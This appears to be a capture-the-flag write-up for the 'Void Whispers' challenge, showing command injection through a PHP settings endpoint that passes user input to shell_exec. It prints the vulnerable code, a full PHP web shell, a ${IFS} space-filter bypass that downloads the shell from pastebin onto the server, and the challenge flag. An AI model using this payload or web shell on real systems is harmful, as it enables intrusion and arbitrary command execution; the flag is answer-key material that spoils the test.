# Void Whispers

## Description

In the dead of night, an eerie silence envelops the town, broken only by the faintest of echoes—whispers in the void. A phantom mailer is sending out silent commands, unseen and unheard, manipulating systems from the shadows. The townsfolk remain oblivious to the invisible puppeteer pulling their strings. Legends hint that sending the right silent message back could reveal hidden secrets. Can you tap into the darkness, craft the perfect unseen command, and shut down the malevolent force before it plunges the world into chaos?

## Solution

In the given source code `IndexController.php` checks validity of `sendMailPath` via `shell_exec` without any restrictions, we can manipulate this variable to get access on server.
```php
  public function updateSetting($router) {
    $from = $_POST['from'];
    $mailProgram = $_POST['mailProgram'];
    $sendMailPath = $_POST['sendMailPath'];
    $email = $_POST['email'];

    if (empty($from) || empty($mailProgram) || empty($sendMailPath) || empty($email)) {
      return $router->jsonify(['message' => 'All fields required!', 'status' => 'danger'], 400);
    }

    if (preg_match('/\s/', $sendMailPath)) {
      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
    }

    $whichOutput = shell_exec("which $sendMailPath");
    if (empty($whichOutput)) {
      return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
    }

    $this->config['from'] = $from;
    $this->config['mailProgram'] = $mailProgram;
    $this->config['sendMailPath'] = $sendMailPath;
    $this->config['email'] = $email;

    file_put_contents($this->configFile, json_encode($this->config));

    return $router->jsonify(['message' => 'Config updated successfully!', 'status' => 'success'], 200);
  }
```

Originally I wanted [p0wny-shell](https://github.com/flozz/p0wny-shell), `curl` can be used to download files, but it didn't work and returned 500.

So I cooked up simple interactive webshell:
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>PHP Web Shell</title>
        <style>
            body { background-color: #333; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
            .container { max-width: 800px; margin: 50px auto; padding: 20px; background-color: #444; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); }
            h1 { text-align: center; color: #00ff00; }
            input, textarea { width: 100%; background-color: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; border-radius: 5px; margin-bottom: 10px; }
            button { width: 100%; background-color: #00ff00; color: #222; border: none; padding: 10px; font-size: 16px; border-radius: 5px; cursor: pointer; }
            button:hover { background-color: #00cc00; }
            pre { background-color: #222; padding: 10px; border-radius: 5px; border: 1px solid #00ff00; overflow-x: auto; }
        </style>
        </head>
    <body>
        <div class="container">
            <h1>PHP Web Shell</h1>
            <form method="POST">
                <input type="text" name="command" placeholder="Enter your command..." autofocus />
                <button type="submit">Run Command</button>
            </form>
            <h3>Output:</h3>
            <pre><?php
            if (isset($_POST['command'])) { echo htmlspecialchars(shell_exec($_POST['command'])); }
        ?></pre>
        </div>
    </body>
</html> 
```

Upload the code to `pastebin` or similar so it can be downloaded.

The app filters for any space character, but since command is passed to subshell `${IFS}` is a valid replacement for space.
```bash
curl${IFS}https://pastebin.com/raw/szTiUQL1${IFS}-so${IFS}/www/t.php
```

![Void Whispers-2.png](/assets/ctf/htb/void-whispers-2.png)

Visit the webshell and find flag:

![Void Whispers.png](/assets/ctf/htb/void-whispers.png)

Get flag:

![Void Whispers-1.png](/assets/ctf/htb/void-whispers-1.png)

> Flag: `HTB{c0mm4nd_1nj3ct10n_4r3_3457_70_f1nD!!_96353be35ebbc45395fc4867f38d7784}`

